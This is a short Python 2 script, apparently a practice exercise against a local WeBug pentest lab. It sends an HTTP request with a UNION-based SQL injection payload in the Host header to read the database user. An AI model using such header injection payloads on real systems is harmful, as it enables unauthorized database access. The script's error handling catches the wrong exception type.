__author__ = 'feifei'
# coding=utf-8
import urllib2


def get_request(url):
    i_headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Host": "union select 1,2,user(),4 from goods",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36"
    }
    try:
        req = urllib2.Request(url, headers=i_headers)
        response = urllib2.urlopen(req)
        print response.info()
        html = response.read()
        print html
    except ZeroDivisionError, e:
        print e.message


if __name__ == '__main__':
    url = "http://192.168.128.135/webug/pentest/test/15/"
    get_request(url)
